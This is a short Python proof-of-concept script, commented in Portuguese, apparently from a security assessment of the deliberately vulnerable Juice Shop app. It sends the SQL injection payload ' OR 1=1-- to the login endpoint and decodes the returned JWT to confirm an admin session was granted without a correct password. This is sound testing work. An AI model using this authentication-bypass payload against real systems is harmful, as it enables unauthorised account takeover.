"""Prova de conceito de SQL Injection (A03 Injection) no login do Juice Shop.

Complementa a evidência original (capturas de tela do DevTools) com uma
versão reproduzível por linha de comando: envia o payload clássico de
bypass de autenticação (`' OR 1=1--`) no campo de e-mail do endpoint de
login e confirma, pela decodificação do JWT retornado, que a
autenticação foi concedida como a conta administrativa, sem qualquer
senha correta ter sido fornecida.
"""

from __future__ import annotations

from scripts.lib import config
from scripts.lib.evidence import EvidenceRecorder
from scripts.lib.http_session import ScopedSession
from scripts.lib.jwt_tools import decodificar_payload

ACHADO_ID = "V1"
SLUG = "sqli-login"

PAYLOAD_EMAIL = "' OR 1=1--"
SENHA_QUALQUER = "senha-nao-precisa-ser-correta"


def executar() -> None:
    """Executa a prova de conceito e imprime o veredito."""
    recorder = EvidenceRecorder(ACHADO_ID, SLUG)
    sessao = ScopedSession(recorder=recorder)

    resposta = sessao.post(
        f"{config.BASE_URL}/rest/user/login",
        json={"email": PAYLOAD_EMAIL, "password": SENHA_QUALQUER},
    )

    print(f"Status HTTP: {resposta.status_code}")
    if resposta.status_code != 200:
        print("RESULTADO: bypass não confirmado nesta execução.")
        return

    corpo = resposta.json()
    payload = decodificar_payload(corpo["authentication"]["token"])
    email_autenticado = payload["data"]["email"]
    papel = payload["data"]["role"]

    print(f"Autenticado como: {email_autenticado} (papel: {papel})")
    if papel == "admin":
        print(
            "RESULTADO: SQL Injection confirmado — bypass de autenticação "
            "concedeu sessão administrativa sem senha correta."
        )
    else:
        print("RESULTADO: autenticação concedida, mas não como administrador.")
    print(f"Evidência gravada em: {recorder.directory}")


if __name__ == "__main__":
    executar()
